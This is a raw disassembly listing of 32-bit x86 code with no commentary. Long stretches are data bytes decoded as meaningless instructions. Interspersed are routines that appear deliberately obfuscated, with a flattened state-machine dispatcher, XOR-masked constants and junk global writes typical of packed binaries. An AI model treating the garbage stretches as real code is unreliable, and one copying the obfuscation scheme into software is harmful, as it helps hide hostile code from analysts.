  40918f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409190:	add    BYTE PTR [eax+0x2b],dl
  409193:	lods   eax,DWORD PTR ds:[esi]
  409194:	cs sub eax,0xa678f47b
  40919a:	(bad)  
  40919b:	ds in  eax,dx
  40919d:	sti    
  40919e:	sub    eax,0x7d8f3ffc
  4091a3:	dec    edi
  4091a4:	mov    eax,0x5207949a
  4091a9:	cmp    al,0x38
  4091ab:	ds push cs
  4091ad:	sub    ch,bh
  4091af:	mov    ds:0xe7498692,al
  4091b4:	adc    al,BYTE PTR [ebp-0x257d812b]
  4091ba:	nop
  4091bb:	push   0xb667a156
  4091c0:	loop   0x40914c
  4091c2:	xor    bl,BYTE PTR [eax-0x6994157d]
  4091c8:	adc    eax,0x32946dc9
  4091cd:	pop    ss
  4091ce:	xchg   esi,eax
  4091cf:	push   ds
  4091d0:	push   esp
  4091d1:	cwde   
  4091d2:	shl    DWORD PTR [ecx],0x59
  4091d5:	lea    edi,[ebx+0x12ec4bbe]
  4091db:	mov    eax,0xf91b50bb
  4091e0:	ret    0xfb82
  4091e3:	rcr    DWORD PTR [ecx-0x7a],1
  4091e6:	pop    esi
  4091e7:	push   es
  4091e8:	adc    al,0x91
  4091ea:	pop    esp
  4091eb:	ins    BYTE PTR es:[edi],dx
  4091ec:	dec    ebx
  4091ed:	inc    esp
  4091ee:	xor    BYTE PTR [edi-0x61],bh
  4091f1:	ficom  WORD PTR [eax-0x5e7c79a3]
  4091f7:	inc    edi
  4091f8:	and    edx,ebp
  4091fa:	cwde   
  4091fb:	pop    eax
  4091fc:	pusha  
  4091fd:	jb     0x40927d
  4091ff:	fst    QWORD PTR [ebx-0x5ded9829]
  409205:	cmp    al,BYTE PTR [esi-0x16]
  409208:	mov    edx,0x55c3f54a
  40920d:	inc    ebx
  40920e:	xor    ebx,ecx
  409210:	das    
  409211:	aas    
  409212:	lock pop edi
  409214:	cmp    al,0x2c
  409216:	mov    edi,0xe6c6e7b9
  40921b:	add    DWORD PTR [ebp+0x1b],edi
  40921e:	test   eax,0xcf006c54
  409223:	pop    esp
  409224:	aaa    
  409225:	sbb    DWORD PTR [edi-0x9],0x46
  409229:	cmp    BYTE PTR [ebx-0x2e],bl
  40922c:	jo     0x409280
  40922e:	jp     0x40923c
  409230:	push   ebp
  409231:	ss dec ecx
  409233:	jmp    0x8dcc:0x635c8415
  40923a:	jb     0x4092ab
  40923c:	jp     0x409202
  40923e:	ss pop edx
  409240:	push   0x7d
  409242:	mov    ah,0x91
  409244:	adc    bl,BYTE PTR [eax-0x4e1759c7]
  40924a:	rcr    BYTE PTR [edx-0x71],0x12
  40924e:	mov    al,0x70
  409250:	jo     0x40923c
  409252:	mov    bl,0xcf
  409254:	xchg   ecx,eax
  409255:	mov    bl,0x8e
  409257:	stc    
  409258:	ror    DWORD PTR [esi],1
  40925a:	(bad)  
  40925b:	xchg   ebx,eax
  40925c:	lea    eax,[eax+0x3de8e04d]
  409262:	test   BYTE PTR [eax+0x50],0x37
  409266:	cmp    BYTE PTR [esp+edx*2],cl
  409269:	in     eax,dx
  40926a:	iret   
  40926b:	lods   al,BYTE PTR ds:[esi]
  40926c:	ins    BYTE PTR es:[edi],dx
  40926d:	sbb    BYTE PTR ds:0xd7911403,dh
  409273:	arpl   cx,bp
  409275:	dec    eax
  409276:	repz push edi
  409278:	mov    WORD PTR [edx-0x3c],?
  40927b:	sub    eax,0xd5236538
  409280:	sbb    BYTE PTR [edx],bl
  409282:	fimul  WORD PTR [ebp+0x2ed54110]
  409288:	inc    esi
  409289:	pop    ecx
  40928a:	fld    QWORD PTR [eax]
  40928c:	in     al,dx
  40928d:	add    eax,0x82de12f8
  409292:	xor    edi,0xcb0cce62
  409298:	pop    ebx
  409299:	lods   al,BYTE PTR ds:[esi]
  40929a:	retf   0x5db9
  40929d:	mov    bl,0x7
  40929f:	cdq    
  4092a0:	into   
  4092a1:	shl    BYTE PTR [ecx],0xd1
  4092a4:	mov    es,WORD PTR [edi]
  4092a6:	lods   al,BYTE PTR ds:[esi]
  4092a7:	jbe    0x4092c5
  4092a9:	push   ss
  4092aa:	xchg   esp,eax
  4092ab:	xchg   edx,eax
  4092ac:	xor    edi,ebx
  4092ae:	mov    ds:0x1d7f66a4,al
  4092b3:	cmp    eax,0x87ef1021
  4092b8:	pop    esp
  4092b9:	(bad)  
  4092ba:	hlt    
  4092bb:	jno    0x4092d0
  4092bd:	mov    dl,0x20
  4092bf:	sub    DWORD PTR [edi-0x6c3500e6],ebx
  4092c5:	scas   eax,DWORD PTR es:[edi]
  4092c6:	cs test eax,0x3edfd82a
  4092cc:	xlat   BYTE PTR ds:[ebx]
  4092cd:	leave  
  4092ce:	inc    ecx
  4092cf:	push   ss
  4092d0:	push   eax
  4092d1:	or     BYTE PTR [eax-0x5],cl
  4092d4:	sub    eax,DWORD PTR [ebx-0x41]
  4092d7:	pop    ebx
  4092d8:	xor    eax,0x7d91a022
  4092dd:	cmp    cl,al
  4092df:	mov    ebx,DWORD PTR [ebx+esi*8]
  4092e2:	loop   0x409297
  4092e4:	daa    
  4092e5:	scas   eax,DWORD PTR es:[edi]
  4092e6:	push   es
  4092e7:	popf   
  4092e8:	test   al,cl
  4092ea:	ror    BYTE PTR [ebp-0x3e63a2a3],1
  4092f0:	adc    al,0xff
  4092f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092f3:	shl    dh,0x29
  4092f6:	loop   0x4092e0
  4092f8:	arpl   WORD PTR [edi+0x35c51eb0],sp
  4092fe:	cmp    dh,ch
  409300:	test   DWORD PTR [ecx],0x37b81ad8
  409306:	dec    esi
  409307:	inc    ebx
  409308:	mov    bh,0x8f
  40930a:	xor    edx,esi
  40930c:	jle    0x4092ac
  40930e:	sub    eax,DWORD PTR [ebp-0x42]
  409311:	fcomp  QWORD PTR [edi-0x71427c39]
  409317:	push   esp
  409318:	test   al,0x9b
  40931a:	stos   DWORD PTR es:[edi],eax
  40931b:	clc    
  40931c:	nop
  40931d:	or     ah,BYTE PTR [ebx]
  40931f:	nop
  409320:	dec    ecx
  409321:	sahf   
  409322:	sbb    DWORD PTR [ebp-0x50],0x1f
  409326:	clc    
  409327:	ret    0x13fc
  40932a:	jno    0x409365
  40932c:	xchg   DWORD PTR [edx+0x6e4849e4],eax
  409332:	jnp    0x4093a4
  409334:	popf   
  409335:	cmp    al,dh
  409337:	out    dx,al
  409338:	ret    0x728f
  40933b:	add    eax,0xe8d86be6
  409340:	dec    edi
  409341:	mov    eax,DWORD PTR [ebp-0x14]
  409344:	jmp    0x4084bd
  409349:	mov    eax,DWORD PTR [ebp-0xc]
  40934c:	mov    edx,DWORD PTR [ebp-0x18]
  40934f:	xor    eax,edx
  409351:	cmp    eax,0xa08c1d35
  409356:	je     0x4084ba
  40935c:	mov    eax,DWORD PTR [ebp-0x10]
  40935f:	add    DWORD PTR [eax],0x7403501
  409365:	jmp    0x4084ba
  40936a:	mov    eax,DWORD PTR [ebp-0x1c]
  40936d:	cmp    DWORD PTR [eax],edi
  40936f:	je     0x4084ba
  409375:	mov    eax,0x800f1c9c
  40937a:	jmp    0x4084c1
  40937f:	push   ebp
  409380:	mov    ebp,esp
  409382:	sub    esp,0x60
  409385:	adc    eax,DWORD PTR ds:0x4335e3
  40938b:	jmp    0x4094bf
  409390:	add    al,0xbb
  409392:	js     0x4093e4
  409394:	inc    ebx
  409395:	push   ebx
  409396:	push   esp
  409397:	dec    ebx
  409398:	xor    al,0xcd
  40939a:	in     al,dx
  40939b:	les    edi,FWORD PTR [eax-0x1d]
  40939e:	or     eax,0x7ced9e48
  4093a3:	jl     0x4093ba
  4093a5:	jg     0x409423
  4093a7:	jl     0x409344
  4093a9:	lods   eax,DWORD PTR ds:[esi]
  4093aa:	je     0x40932c
  4093ac:	xchg   esp,eax
  4093ad:	sti    
  4093ae:	jg     0x40937e
  4093b0:	fsub   QWORD PTR [ecx]
  4093b2:	sar    BYTE PTR [edx-0x3f],cl
  4093b5:	pop    ebx
  4093b6:	mov    dh,0x40
  4093b8:	cmp    cl,BYTE PTR [ebx+0x35109072]
  4093be:	rcr    DWORD PTR [esi-0x6686bc35],0x2f
  4093c5:	ds jl  0x409400
  4093c8:	jl     0x409368
  4093ca:	mov    WORD PTR [esi+ecx*4],fs
  4093cd:	mov    WORD PTR [esi+0x7a34cb03],cs
  4093d3:	sti    
  4093d4:	scas   eax,DWORD PTR es:[edi]
  4093d5:	aaa    
  4093d6:	and    DWORD PTR [eax+0x47],ebp
  4093d9:	jns    0x4093b5
  4093db:	xchg   ebx,eax
  4093dc:	(bad)  
  4093dd:	xor    BYTE PTR [ecx],dl
  4093df:	lahf   
  4093e0:	pop    esi
  4093e1:	lods   eax,DWORD PTR ds:[esi]
  4093e2:	mov    ecx,0x378e46dc
  4093e7:	je     0x4093e6
  4093e9:	mov    al,0x80
  4093eb:	inc    ecx
  4093ec:	jb     0x4093d1
  4093ee:	xor    BYTE PTR [ebp-0x69243eba],ch
  4093f4:	jno    0x4093b1
  4093f6:	loopne 0x4093be
  4093f8:	inc    ecx
  4093f9:	and    al,BYTE PTR [edx-0x3d]
  4093fc:	loope  0x409385
  4093fe:	ss jmp 0x3ab9e690
  409404:	vpmaddwd ymm6,ymm0,YMMWORD PTR [edi]
  409408:	adc    bh,0x7a
  40940b:	pop    edx
  40940c:	ins    BYTE PTR es:[edi],dx
  40940d:	inc    esp
  40940e:	ds xchg ebx,eax
  409410:	dec    ebx
  409411:	pop    es
  409412:	xlat   BYTE PTR ds:[ebx]
  409413:	mov    al,ds:0x1dfb1ce1
  409418:	arpl   si,sp
  40941a:	loopne 0x409464
  40941c:	mov    WORD PTR [edx],ss
  40941e:	(bad)
  409421:	xor    eax,esp
  409423:	scas   eax,DWORD PTR es:[edi]
  409424:	push   es
  409425:	and    cl,BYTE PTR [esi]
  409427:	xchg   esi,eax
  409428:	daa    
  409429:	cmp    BYTE PTR ds:0x3ef3f352,0x44
  409430:	js     0x40943c
  409432:	jmp    0x409443
  409434:	add    al,0x0
  409436:	rcr    DWORD PTR [esp+ebp*2+0x266cd959],0x2d
  40943e:	je     0x4094b7
  409440:	neg    DWORD PTR [edx+0x35]
  409443:	fimul  WORD PTR [ebp-0x5ab9ff9b]
  409449:	jbe    0x4094a4
  40944b:	and    al,0x50
  40944d:	inc    edi
  40944e:	popf   
  40944f:	mov    ds:0x7ee28b4e,al
  409454:	inc    edx
  409455:	push   ss
  409456:	dec    ebx
  409457:	nop
  409458:	xchg   edi,eax
  409459:	pop    ebp
  40945a:	mov    esp,ebp
  40945c:	adc    al,0x62
  40945e:	in     al,dx
  40945f:	sbb    BYTE PTR [esi+edx*2+0x26],al
  409463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409464:	mov    esi,DWORD PTR [eax-0x29]
  409467:	repnz fndisi(8087 only) 
  40946a:	lock loopne 0x4094d4
  40946d:	int    0x9e
  40946f:	push   0x61d3a23e
  409474:	xor    dl,dh
  409476:	xor    ebp,DWORD PTR [ecx+0xd]
  409479:	out    0x25,al
  40947b:	hlt    
  40947c:	lahf   
  40947d:	ins    DWORD PTR es:[edi],dx
  40947e:	push   ecx
  40947f:	jne    0x4094f5
  409481:	cmp    BYTE PTR [esi-0x1735c77f],0x32
  409488:	shr    BYTE PTR [ecx],1
  40948a:	scas   ax,WORD PTR es:[edi]
  40948c:	rol    BYTE PTR [esi+0x74199b7d],1
  409492:	jnp    0x40946c
  409494:	arpl   bx,ax
  409496:	test   DWORD PTR [edx-0x7af277d8],ecx
  40949c:	dec    ebx
  40949d:	int    0xdb
  40949f:	js     0x4094c8
  4094a1:	mov    ebp,0xd73e76a
  4094a6:	sbb    DWORD PTR [edi-0x56fdb0b1],eax
  4094ac:	pop    eax
  4094ad:	add    BYTE PTR [ebp-0x5029a34e],0xcd
  4094b4:	jne    0x4094df
  4094b6:	jp     0x4094c1
  4094b8:	in     al,dx
  4094b9:	mov    ch,0x52
  4094bb:	sub    DWORD PTR [edi+0x458bfc59],0x8
  4094c2:	or     DWORD PTR ds:0x4335e7,0xc38
  4094cc:	push   ebx
  4094cd:	adc    DWORD PTR ds:0x433557,0x6147
  4094d7:	push   esi
  4094d8:	mov    esi,0x7510853
  4094dd:	add    DWORD PTR ds:0x433667,0x296a
  4094e7:	xor    eax,esi
  4094e9:	and    ebx,0x43d6
  4094ef:	mov    ebx,0x32729a
  4094f4:	and    DWORD PTR ds:0x43355f,0x433557
  4094fe:	add    eax,ebx
  409500:	adc    DWORD PTR ds:0x43365f,0x1959
  40950a:	push   edi
  40950b:	or     DWORD PTR ds:0x4335ab,ecx
  409511:	mov    DWORD PTR [ebp-0x18],eax
  409514:	and    DWORD PTR ds:0x43355b,0x4f47
  40951e:	mov    edi,DWORD PTR [ebp+0x8]
  409521:	xor    edi,esi
  409523:	sbb    DWORD PTR ds:0x4335af,0x43366b
  40952d:	mov    DWORD PTR [ebp-0xc],0xf89c85f5
  409534:	or     DWORD PTR ds:0x4335af,0x30d7
  40953e:	mov    DWORD PTR [ebp-0x10],0xf89c8735
  409545:	add    DWORD PTR ds:0x433567,0x43362f
  40954f:	add    edi,ebx
  409551:	jmp    0x4099a2
  409556:	mov    DWORD PTR ds:0x433597,0x217e
  409560:	cmp    edi,0x40
  409563:	mov    DWORD PTR ds:0x4335ef,0x49f
  40956d:	jne    0x4095a6
  409573:	mov    DWORD PTR ds:0x43366b,ecx
  409579:	mov    eax,ds:0x413996
  40957e:	mov    eax,DWORD PTR [eax]
  409580:	mov    DWORD PTR ds:0x433563,0x21e9
  40958a:	mov    DWORD PTR [ebp-0x14],eax
  40958d:	mov    eax,ds:0x413b9e
  409592:	mov    DWORD PTR ds:0x43362f,0x54b7
  40959c:	mov    eax,DWORD PTR [eax]
  40959e:	mov    DWORD PTR [ebp-0x18],eax
  4095a1:	jmp    0x409996
  4095a6:	mov    DWORD PTR ds:0x43354b,0x76e8
  4095b0:	jmp    0x4096e4
  4095b5:	and    al,0x36
  4095b7:	popf   
  4095b8:	les    ebx,FWORD PTR [ebp-0x6f09829d]
  4095be:	lahf   
  4095bf:	jmp    0x40958c
  4095c1:	sar    ch,1
  4095c3:	test   BYTE PTR [edx+0x7c7cecb7],0x15
  4095ca:	jg     0x409648
  4095cc:	jl     0x40957a
  4095ce:	xchg   esi,eax
  4095cf:	xor    ebx,DWORD PTR [esi]
  4095d1:	xchg   edi,eax
  4095d2:	xchg   ebp,eax
  4095d3:	popa   
  4095d4:	or     DWORD PTR [edi-0x4c],eax
  4095d7:	inc    esi
  4095d8:	mov    BYTE PTR [ecx+0x57234218],al
  4095de:	retf   
  4095df:	dec    edi
  4095e0:	mov    BYTE PTR [edx-0x939a233],0x5e
  4095e7:	jg     0x409615
  4095e9:	push   edx
  4095ea:	rcr    ebp,1
  4095ec:	adc    edx,DWORD PTR ds:0x3288d03c
  4095f2:	sbb    esp,DWORD PTR [esi]
  4095f4:	dec    ecx
  4095f5:	or     eax,0xf12206e8
  4095fa:	outs   dx,BYTE PTR ds:[esi]
  4095fb:	mov    al,ds:0x8df4fae1
  409600:	imul   DWORD PTR [esi+0x1beda1ec]
  409606:	pop    ebp
  409607:	xor    DWORD PTR [eax-0x77dfcb44],ebx
  40960d:	das    
  40960e:	jmp    0x409626
  409610:	lea    esp,[ebx]
  409612:	mov    fs,WORD PTR [esi+0x7a]
  409615:	xchg   edx,eax
  409616:	sbb    DWORD PTR [edi-0x16a7a84],ecx
  40961c:	(bad)  
  40961e:	retf   0x93ee
  409621:	cmp    edi,ebx
  409623:	pop    ecx
  409624:	add    ch,BYTE PTR [eax]
  409626:	rcpps  xmm7,xmm5
  409629:	pop    esp
  40962a:	in     eax,0x8b
  40962c:	mov    ?,esp
  40962e:	sbb    edx,DWORD PTR [edi-0x4e309f02]
  409634:	push   0xffffffd1
  409636:	test   DWORD PTR [esi-0x3e],ebx
  409639:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40963b:	mov    cs,edi
  40963d:	loop   0x4095f5
  40963f:	dec    edx
  409640:	add    al,0x1e
  409642:	bound  edx,QWORD PTR ds:0x861b2439
  409648:	pusha  
  409649:	jl     0x4096b7
  40964b:	adc    eax,0x40241b1e
  409650:	sbb    BYTE PTR ds:0xd053e23b,cl
  409656:	sbb    DWORD PTR [esp+ebp*1+0x226dae15],0x7bf87c2c
  409661:	pop    ecx
  409662:	fldenv [esi]
  409664:	cmp    DWORD PTR [ecx+0x40],edx
  409667:	jnp    0x40968c
  409669:	xchg   ecx,eax
  40966a:	(bad)  
  40966b:	(bad)  
  40966c:	fcmovbe st,st(0)
  40966e:	cmp    al,0x2a
  409670:	cmp    bh,BYTE PTR [edx]
  409672:	mov    gs,WORD PTR [eax+edx*4]
  409675:	sub    ch,al
  409677:	test   DWORD PTR [edi],esp
  409679:	mov    ecx,0x315eaaef
  40967e:	pop    edx
  40967f:	dec    ecx
  409680:	sub    esp,DWORD PTR [ebp+0x63]
  409683:	cmp    al,0x34
  409685:	popf   
  409686:	or     dl,bl
  409688:	es adc dl,ch
  40968b:	pop    edi
  40968c:	and    eax,0x7e38038b
  409691:	push   0xf411597e
  409696:	cli    
  409697:	jmp    0x1e7e:0xe114b4bf
  40969e:	mov    bh,0xc0
  4096a0:	mov    ecx,0x4ce54f68
  4096a5:	outs   dx,DWORD PTR ds:[esi]
  4096a6:	into   
  4096a7:	sub    DWORD PTR [edx-0x14],ecx
  4096aa:	mov    cl,0x3
  4096ac:	xor    DWORD PTR [ebp-0x23],eax
  4096af:	xchg   ebx,eax
  4096b0:	inc    edi
  4096b1:	add    eax,0xc74d5e16
  4096b6:	xor    al,0x0
  4096b8:	sar    DWORD PTR [ecx],0x30
  4096bb:	outs   dx,BYTE PTR ds:[esi]
  4096bc:	pop    ebp
  4096bd:	xchg   ebp,eax
  4096be:	cs mov bh,0x94
  4096c1:	stos   BYTE PTR es:[edi],al
  4096c2:	push   es
  4096c3:	jmp    0x40969a
  4096c5:	test   DWORD PTR [ebx],0x44a36e91
  4096cb:	scas   eax,DWORD PTR es:[edi]
  4096cc:	mov    dh,0x85
  4096ce:	sbb    eax,0xb6cea767
  4096d3:	add    BYTE PTR [esi+0x41],bh
  4096d6:	call   0xa1c3:0x40da0a00
  4096dd:	(bad)  
  4096de:	test   eax,0x7d10c09
  4096e3:	push   0x33dff81
  4096e8:	add    BYTE PTR [eax],al
  4096ea:	mov    DWORD PTR ds:0x4335d7,0x197
  4096f4:	jne    0x409766
  4096fa:	and    DWORD PTR [ebp+0x8],0x0
  4096fe:	mov    eax,DWORD PTR [ebp-0x8]
  409701:	or     DWORD PTR ds:0x433623,0x4335e3
  40970b:	sub    eax,DWORD PTR [ebp+0x8]
  40970e:	push   eax
  40970f:	mov    eax,ds:0x433663
  409714:	or     DWORD PTR ds:0x433623,eax
  40971a:	mov    eax,DWORD PTR [ebp-0x4]
  40971d:	add    DWORD PTR ds:0x43353f,0x4335af
  409727:	add    eax,DWORD PTR [ebp+0x8]
  40972a:	sub    DWORD PTR ds:0x433627,0x4335a7
  409734:	push   eax
  409735:	dec    DWORD PTR ds:0x43354b
  40973b:	call   0x4099bc
  409740:	mov    DWORD PTR ds:0x433617,0x29a7
  40974a:	inc    DWORD PTR [ebp+0x8]
  40974d:	cmp    DWORD PTR [ebp+0x8],0x52
  409751:	mov    DWORD PTR ds:0x43355f,0x7d48
  40975b:	jb     0x4096fe
  409761:	jmp    0x409996
  409766:	mov    DWORD PTR ds:0x4335ef,0x5779
  409770:	cmp    edi,0x1a3
  409776:	mov    DWORD PTR ds:0x433667,0x175d
  409780:	jne    0x409964
  409786:	movzx  eax,BYTE PTR ds:0x43353f
  40978d:	and    DWORD PTR ds:0x4335af,eax
  409793:	mov    DWORD PTR [ebp-0x60],0xf89c8539
  40979a:	add    DWORD PTR ds:0x43362f,ebx
  4097a0:	mov    eax,DWORD PTR [ebp-0x4]
  4097a3:	xor    DWORD PTR ds:0x43359f,0x2808
  4097ad:	mov    DWORD PTR [ebp-0x5c],eax
  4097b0:	sub    eax,DWORD PTR ds:0x4335e7
  4097b6:	mov    eax,DWORD PTR [ebp-0x8]
  4097b9:	mov    DWORD PTR [ebp-0x58],eax
  4097bc:	mov    eax,DWORD PTR [ebp-0xc]
  4097bf:	xor    eax,esi
  4097c1:	and    DWORD PTR ds:0x433627,0x5f09
  4097cb:	add    eax,ebx
  4097cd:	and    DWORD PTR ds:0x43355f,0x3046
  4097d7:	mov    DWORD PTR [ebp-0x54],eax
  4097da:	sbb    DWORD PTR ds:0x4335eb,0x433633
  4097e4:	lea    eax,[ebp-0x1c]
  4097e7:	add    DWORD PTR ds:0x43361b,0x7d23
  4097f1:	mov    DWORD PTR [ebp-0x50],eax
  4097f4:	sub    eax,DWORD PTR ds:0x43355f
  4097fa:	mov    eax,DWORD PTR [ebp-0x60]
  4097fd:	or     DWORD PTR ds:0x4335b3,0x4335af
  409807:	xor    eax,esi
  409809:	add    eax,ebx
  40980b:	mov    DWORD PTR [ebp-0x60],eax
  40980e:	lea    eax,[ebp-0x60]
  409811:	push   eax
  409812:	mov    eax,DWORD PTR [ebp+0xc]
  409815:	jmp    0x409949
  40981a:	xchg   cl,bl
  40981c:	fs jg  0x409886
  40981f:	and    DWORD PTR [ecx+0x61],0x87fe859e
  409826:	or     BYTE PTR [edx],al
  409828:	stos   DWORD PTR es:[edi],eax
  409829:	lods   al,BYTE PTR ds:[esi]
  40982a:	dec    esp
  40982b:	out    dx,eax
  40982c:	jl     0x4098aa
  40982e:	adc    eax,0xb97c7c7f
  409833:	inc    ebp
  409834:	pop    ebp
  409835:	xchg   ebp,eax
  409836:	pushf  
  409837:	push   esp
  409838:	xchg   esi,eax
  409839:	sub    BYTE PTR [ebp+0x29264060],cl
  40983f:	pop    edi
  409840:	fisub  DWORD PTR [eax]
  409842:	adc    eax,0xde9dfe2e
  409847:	or     eax,0xcb2490f8
  40984c:	mov    DWORD PTR [edi-0x6a55879d],esi
  409852:	cmp    ah,BYTE PTR [esp+eax*8-0x1de6083a]
  409859:	jp     0x40981c
  40985b:	cmp    al,BYTE PTR [edx+esi*4-0x78]
  40985f:	jbe    0x409873
  409861:	mov    eax,ds:0x6c82d6e7
  409866:	dec    eax
  409867:	hlt    
  409868:	jg     0x40981b
  40986a:	push   0x295d6950
  40986f:	shl    BYTE PTR [eax+0x11877de3],cl
  409875:	out    dx,al
  409876:	fidivr WORD PTR [esi+0x58]
  409879:	sub    BYTE PTR [edi-0x62],0x5f
  40987d:	fsubr  QWORD PTR [eax-0x3badbf04]
  409883:	push   ds
  409884:	and    eax,0xd0586543
  409889:	xchg   esi,eax
  40988a:	cmp    dl,bl
  40988c:	clc    
  40988d:	jmp    0xfd96bbc5
  409892:	add    ebp,esi
  409894:	push   0x4f53cf94
  409899:	and    BYTE PTR [esi],ch
  40989b:	idiv   DWORD PTR [esi]
  40989d:	test   BYTE PTR [ecx-0x45d96c90],cl
  4098a3:	(bad)  
  4098a4:	or     bl,BYTE PTR [ecx+0x1636664e]
  4098aa:	sub    BYTE PTR [ecx-0x34],dl
  4098ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098ae:	xor    al,0x73
  4098b0:	xchg   esi,eax
  4098b1:	xchg   edx,eax
  4098b2:	pop    es
  4098b3:	lods   eax,DWORD PTR ds:[esi]
  4098b4:	imul   edi,DWORD PTR [ebp+0x3f],0x1f
  4098b8:	mov    ds:0xd7a51cec,eax
  4098bd:	mov    ds:0xec6d87f7,al
  4098c2:	cmc    
  4098c3:	and    ah,BYTE PTR [edx]
  4098c5:	adc    ecx,ebp
  4098c7:	jmp    0x4098f4
  4098c9:	retf   0x196e
  4098cc:	pop    edi
  4098cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098ce:	mov    ecx,0x22888874
  4098d3:	lods   al,BYTE PTR ds:[esi]
  4098d4:	out    dx,eax
  4098d5:	xor    DWORD PTR [edi+eax*8],esi
  4098d8:	leave  
  4098d9:	jge    0x409896
  4098db:	into   
  4098dc:	pop    edi
  4098dd:	fiadd  DWORD PTR [edx]
  4098df:	aaa    
  4098e0:	jecxz  0x409944
  4098e2:	imul   esp,DWORD PTR [ebp+0x4b],0x7a
  4098e6:	sub    al,0x2c
  4098e8:	ret    
  4098e9:	(bad)  
  4098ea:	adc    edx,esi
  4098ec:	imul   esp,DWORD PTR [esi],0x39ec2bc0
  4098f2:	pusha  
  4098f3:	and    BYTE PTR [edi],0x12
  4098f6:	imul   ebp,DWORD PTR [eax+ebp*4],0xaa79a275
  4098fd:	xchg   esp,eax
  4098fe:	lahf   
  4098ff:	(bad)  
  409900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409901:	iret   
  409902:	or     edi,DWORD PTR [ebx-0x7f]
  409905:	ja     0x40988d
  409907:	sbb    ah,bl
  409909:	fs xchg edx,eax
  40990b:	ins    DWORD PTR es:[edi],dx
  40990c:	aaa    
  40990d:	test   eax,0xaff2609c
  409913:	inc    edx
  409914:	inc    esi
  409915:	nop
  409916:	mov    ebx,0xe55da329
  40991b:	jmp    0x1caf:0xe34b9ad8
  409922:	cmp    al,0xa1
  409924:	dec    ecx
  409925:	stos   BYTE PTR es:[edi],al
  409926:	xlat   BYTE PTR ds:[ebx]
  409927:	xchg   edx,eax
  409928:	dec    ebx
  409929:	ins    BYTE PTR es:[edi],dx
  40992a:	int3   
  40992b:	hlt    
  40992c:	(bad)  
  40992d:	jns    0x409991
  40992f:	stos   DWORD PTR es:[edi],eax
  409930:	jo     0x40991c
  409932:	xor    DWORD PTR [eax+esi*1-0x5a716001],esi
  409939:	(bad)  
  40993a:	mov    es:0x552c78d5,al
  409940:	popa   
  409941:	push   DWORD PTR [esi+0x5a]
  409944:	inc    edx
  409945:	xchg   esi,eax
  409946:	fnstcw WORD PTR [ecx-0xf]
  409949:	xor    eax,esi
  40994b:	add    eax,ebx
  40994d:	push   eax
  40994e:	mov    eax,ds:0x413b36
  409953:	push   0x413a8c
  409958:	push   DWORD PTR [eax]
  40995a:	call   0x4100b5
  40995f:	jmp    0x409996
  409964:	cmp    edi,0x13d
  40996a:	jne    0x409996
  409970:	mov    eax,DWORD PTR [ebp-0x10]
  409973:	xor    eax,esi
  409975:	add    eax,ebx
  409977:	mov    DWORD PTR [ebp+0x8],eax
  40997a:	mov    eax,ds:0x413b16
  40997f:	mov    DWORD PTR [ebp+0x8],eax
  409982:	mov    eax,DWORD PTR [ebp-0x14]
  409985:	mov    DWORD PTR [ebp-0x4],eax
  409988:	mov    eax,DWORD PTR [ebp-0x4]
  40998b:	push   0x4
  40998d:	pop    ecx
  40998e:	sub    ecx,eax
  409990:	add    ecx,DWORD PTR [ebp-0x18]
  409993:	mov    DWORD PTR [ebp-0x8],ecx
  409996:	mov    eax,DWORD PTR [ebp+0xc]
  409999:	xor    eax,esi
  40999b:	lea    edi,[edi+eax*1+0x32729a]
  4099a2:	cmp    edi,0x50b
  4099a8:	jne    0x409556
  4099ae:	mov    eax,DWORD PTR [ebp+0xc]
  4099b1:	pop    edi
  4099b2:	xor    eax,esi
  4099b4:	pop    esi
  4099b5:	add    eax,ebx
  4099b7:	pop    ebx
  4099b8:	leave  
  4099b9:	ret    0x8
  4099bc:	push   ebp
  4099bd:	mov    ebp,esp
  4099bf:	sub    esp,0x44
  4099c2:	neg    edx
  4099c4:	push   edi
  4099c5:	mov    eax,DWORD PTR [ebp+0xc]
  4099c8:	mov    edi,DWORD PTR ds:0x433633
  4099ce:	sub    DWORD PTR ds:0x43353f,edi
  4099d4:	mov    DWORD PTR [ebp-0x10],eax
  4099d7:	and    DWORD PTR ds:0x4335ef,0x1af7
  4099e1:	mov    eax,DWORD PTR [ebp+0x8]
  4099e4:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4099eb:	and    DWORD PTR ds:0x43362f,ebx
  4099f1:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  4099f8:	or     DWORD PTR ds:0x4335b3,ebx
  4099fe:	mov    edx,DWORD PTR [ebp+0x8]
  409a01:	add    DWORD PTR ds:0x43354f,ebx
  409a07:	mov    DWORD PTR [ebp-0x40],eax
  409a0a:	mov    eax,0x7510853
  409a0f:	mov    DWORD PTR ds:0x4335e3,0x1e
  409a19:	cmp    DWORD PTR ds:0x4335e3,0x0
  409a20:	je     0x409a5e
  409a26:	cmp    DWORD PTR ds:0x4335e3,0x20
  409a2d:	jne    0x409a46
  409a33:	push   DWORD PTR [ebp-0xc]
  409a36:	push   0x43361b
  409a3b:	push   0x4dbc
  409a40:	call   DWORD PTR ds:0x412198
  409a46:	mov    edi,DWORD PTR ds:0x4335e3
  409a4c:	dec    edi
  409a4d:	mov    DWORD PTR ds:0x4335e3,edi
  409a53:	jmp    0x409a19
  409a58:	sbb    DWORD PTR ds:0x433673,ebx
  409a5e:	xor    edx,eax
  409a60:	and    DWORD PTR ds:0x4335db,0x1370
  409a6a:	mov    ecx,0x32729a
  409a6f:	xor    edi,DWORD PTR ds:0x433553
  409a75:	add    edx,ecx
  409a77:	adc    edi,0x4100
  409a7d:	mov    DWORD PTR [ebp-0x8],edx
  409a80:	mov    DWORD PTR ds:0x43353f,0x11
  409a8a:	cmp    DWORD PTR ds:0x43353f,0x0
  409a91:	je     0x409aec
  409a97:	cmp    DWORD PTR ds:0x43353f,0x6
  409a9e:	jne    0x409ab4
  409aa4:	push   0x53f1
  409aa9:	push   0x7cf0
  409aae:	call   DWORD PTR ds:0x412260
  409ab4:	cmp    DWORD PTR ds:0x43353f,0x7
  409abb:	jne    0x409ad0
  409ac1:	xor    edi,edi
  409ac3:	add    edi,DWORD PTR ds:0x43353f
  409ac9:	dec    edi
